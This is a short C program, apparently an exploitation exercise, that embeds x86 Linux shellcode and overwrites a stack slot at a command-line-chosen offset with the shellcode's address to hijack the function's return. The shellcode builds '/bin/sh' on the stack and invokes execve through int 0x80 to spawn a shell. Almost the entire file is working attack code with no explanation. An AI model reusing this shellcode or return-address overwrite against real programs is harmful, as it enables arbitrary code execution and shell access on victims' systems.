#include <stdlib.h>

void func(char bytes_back)
{
	char *shellcode = "\x83\xec\x20\x31\xc0\x89\x44\x24\x08\xc7\x44\x24\x18\x2f\x62\x69\x6e\xc7\x44\x24\x1c\x2f\x73\x68\xf0\x81\x64\x24\x1c\x2f\x73\x68\x0f\x31\xd2\x8d\x5c\x24\x18\x89\x5c\x24\x10\x8d\x4c\x24\x10\xb8\x0b\xf0\xf0\xf0\x25\xff\x0f\x0f\x0f\xcd\x80";
	unsigned int *return_addr;

	return_addr = (unsigned int *) (&shellcode + bytes_back);
	(*return_addr) = (unsigned int) shellcode;
}

int main(int argc, char *argv[])
{
	char bytes_back;

	bytes_back = (argc > 1) ? atoi(argv[1]) : 15;

	func(bytes_back);

	return 1;
}